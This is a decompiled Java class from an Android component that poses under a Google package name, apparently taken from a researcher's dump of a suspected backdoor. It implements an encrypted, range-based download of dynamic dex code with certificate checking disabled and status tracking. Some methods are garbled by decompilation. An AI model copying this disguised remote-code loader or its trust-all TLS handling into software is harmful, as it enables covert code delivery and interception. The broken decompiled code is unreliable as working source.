package com.google.android.sd.biz_dynamic_dex.download;

import android.content.Context;
import android.text.TextUtils;
import android.util.Base64;
import com.google.android.sd.biz_dynamic_dex.base.b;
import com.google.android.sd.biz_dynamic_dex.base.c;
import com.google.android.sd.utils.DataUtils;
import com.google.android.sd.utils.TrackUtils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import org.json.JSONObject;

public final class a {
  String a;
  
  long b;
  
  String c;
  
  File d;
  
  int e;
  
  boolean f = true;
  
  boolean g = true;
  
  int h;
  
  final Context i;
  
  private int j = 1;
  
  public a(Context paramContext) {
    this.i = paramContext.getApplicationContext();
  }
  
  static long a(String paramString) {
    try {
      return Long.parseLong(paramString);
    } catch (Exception exception) {
      return -1L;
    } 
  }
  
  private static byte[] a(InputStream paramInputStream) {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    byte[] arrayOfByte = new byte[4096];
    try {
      while (true) {
        int i = paramInputStream.read(arrayOfByte);
        if (-1 != i) {
          byteArrayOutputStream.write(arrayOfByte, 0, i);
          continue;
        } 
        break;
      } 
    } catch (Exception exception1) {
    
    } finally {
      try {
        byteArrayOutputStream.close();
      } catch (Exception exception) {}
    } 
    try {
      exception.close();
    } catch (Exception exception1) {}
  }
  
  private byte[] a(String paramString1, String paramString2, long paramLong1, long paramLong2) {
    try {
      byte[] arrayOfByte;
      "http request url: ".concat(String.valueOf(paramString1));
      c.b();
      "http request param: ".concat(String.valueOf(paramString2));
      c.b();
      if (!TextUtils.isEmpty(this.a)) {
        arrayOfByte = Base64.decode(this.a.getBytes(), 0);
        "aesKeyByte  1: ".concat(String.valueOf(arrayOfByte));
        c.b();
      } else {
        arrayOfByte = b.b();
        this.a = new String(Base64.encode(arrayOfByte, 0));
        "aesKeyByte  2: ".concat(String.valueOf(arrayOfByte));
        c.b();
        (new StringBuilder("aesKey: ")).append(this.a);
        c.b();
        DataUtils.setString("com.google.android.sd.d_e_d_br", this.a);
      } 
      "aesKeyByte  3: ".concat(String.valueOf(arrayOfByte));
      c.b();
      String str1 = b.a(arrayOfByte);
      String str2 = b.a(arrayOfByte, paramString2);
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
      hashMap.put("key", str1);
      hashMap.put("data", str2);
      "key: ".concat(String.valueOf(str1));
      c.b();
      "data: ".concat(String.valueOf(str2));
      c.b();
      HttpsURLConnection httpsURLConnection = (HttpsURLConnection)(new URL(paramString1)).openConnection();
      httpsURLConnection.setDoInput(true);
      httpsURLConnection.setDoOutput(false);
      httpsURLConnection.setUseCaches(false);
      httpsURLConnection.setRequestMethod("GET");
      httpsURLConnection.setConnectTimeout(3000);
      httpsURLConnection.setReadTimeout(3000);
      httpsURLConnection.setRequestProperty("Content-Type", "application/json");
      httpsURLConnection.setRequestProperty("Connection", "close");
      StringBuilder stringBuilder = new StringBuilder("bytes=");
      stringBuilder.append(paramLong1);
      stringBuilder.append("-");
      stringBuilder.append((paramLong2 + 1L) * 512000L);
      httpsURLConnection.setRequestProperty("Range", stringBuilder.toString());
      SSLContext sSLContext = SSLContext.getInstance("TLS");
      sSLContext.init(null, new TrustManager[] { new X509TrustManager(this) {
              public final void checkClientTrusted(X509Certificate[] param1ArrayOfX509Certificate, String param1String) {}
              
              public final void checkServerTrusted(X509Certificate[] param1ArrayOfX509Certificate, String param1String) {}
              
              public final X509Certificate[] getAcceptedIssuers() {
                return null;
              }
            },   }, null);
      httpsURLConnection.setSSLSocketFactory(sSLContext.getSocketFactory());
      for (Map.Entry<Object, Object> entry : hashMap.entrySet())
        httpsURLConnection.setRequestProperty((String)entry.getKey(), (String)entry.getValue()); 
      httpsURLConnection.connect();
      int i = httpsURLConnection.getResponseCode();
    } finally {
      paramString1 = null;
      StringBuilder stringBuilder = new StringBuilder("post_error_");
      stringBuilder.append(paramString1.getMessage());
    } 
    return null;
  }
  
  private JSONObject b() {
    JSONObject jSONObject = new JSONObject();
    try {
      String str1 = String.valueOf(System.currentTimeMillis());
      String str2 = String.valueOf((int)(Math.random() * 2.147483647E9D));
      jSONObject.put("timestamp", str1);
      jSONObject.put("rn", str2);
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str1);
      stringBuilder.append(str2);
      stringBuilder.append("4e8a5e83bc063fdabb21ed321e765de5");
      jSONObject.put("sign", c.b(stringBuilder.toString()));
      jSONObject.put("pid", c.a(this.i));
      jSONObject.put("request_id", UUID.randomUUID().toString());
      return jSONObject;
    } catch (Exception exception) {
      return jSONObject;
    } 
  }
  
  final void a() {
    try {
      DataUtils.setString("com.google.android.sd.d_e_d_br", "");
      DataUtils.setLong("com.google.android.sd.d_e_g_br", -1L);
      DataUtils.setString("com.google.android.sd.d_e_h_br", "");
      if (this.d.exists())
        this.d.delete(); 
      StringBuilder stringBuilder = new StringBuilder("aesKey: ");
      stringBuilder.append(this.a);
      stringBuilder.append(" size: ");
      stringBuilder.append(this.b);
      stringBuilder.append(" md5: ");
      stringBuilder.append(this.c);
      stringBuilder.append(" tempFile: ");
      stringBuilder.append(this.d.exists());
      c.b();
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  final void a(String paramString1, String paramString2) {
    c.b();
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("details", paramString1);
    if (!TextUtils.isEmpty(paramString2))
      hashMap.put("apk_file", paramString2); 
    if (TextUtils.equals("success", paramString1)) {
      paramString1 = "1";
    } else {
      paramString1 = "0";
    } 
    hashMap.put("status", paramString1);
    TrackUtils.submitTrackAsync(this.i, this.h, hashMap);
  }
  
  public static interface a {}
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\download\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */